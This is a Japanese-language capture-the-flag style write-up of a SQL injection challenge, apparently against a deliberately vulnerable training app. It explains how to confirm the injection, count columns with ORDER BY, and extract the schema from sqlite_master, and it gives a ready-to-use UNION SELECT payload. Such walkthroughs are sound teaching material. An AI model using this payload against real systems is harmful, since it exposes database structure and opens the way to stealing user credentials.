# Database Schema ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** SQLi
**目標:** データベースのテーブル構造を取得する

---

## 思考プロセス

**ステップ1: SQLi の存在を確認**
```
「検索機能がある」→「SQLiを試してみよう」
    ↓
「' を入れてエラーを確認」
    ↓
「SQLITE_ERROR が出た！SQLite を使っている」
```

**ステップ2: UNION攻撃の準備**
```
「UNION SELECT でデータを抽出したい」
    ↓
「まず元のクエリのカラム数を調べる必要がある」
    ↓
「ORDER BY で探る: ORDER BY 1, ORDER BY 2, ... ORDER BY 9 でエラー」
    ↓
「カラム数は9個と判明」
```

**ステップ3: 攻撃ペイロードの組み立て**
```
「')) で LIKE の括弧を閉じる」
    ↓
「UNION SELECT で9個のカラムを指定」
    ↓
「sqlite_master から sql カラムを取得」
    ↓
「-- で残りをコメント化」
```

## 実行手順

検索バーに以下を入力:
```
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

## コード/ペイロード

**カラム数の調べ方:**
```sql
')) ORDER BY 1--  → OK
')) ORDER BY 5--  → OK
')) ORDER BY 9--  → OK
')) ORDER BY 10-- → エラー → カラム数は9
```

**sqlite_master とは？**
SQLite の内部テーブルで、データベースの構造情報が格納されている:

| カラム | 内容 |
|--------|------|
| type | テーブル/インデックス/ビューなど |
| name | オブジェクト名 |
| sql | CREATE文 |

## 解説

**取得できる情報の例:**
```sql
CREATE TABLE Users (
  id INTEGER PRIMARY KEY,
  email TEXT UNIQUE,
  password TEXT,
  role TEXT,
  ...
)
```
→ Users テーブルに `email`, `password`, `role` カラムがあることが判明！

## 関連チャレンジ

- [User Credentials](user-credentials.md)
- [Login Admin](../difficulty-2/login-admin.md)
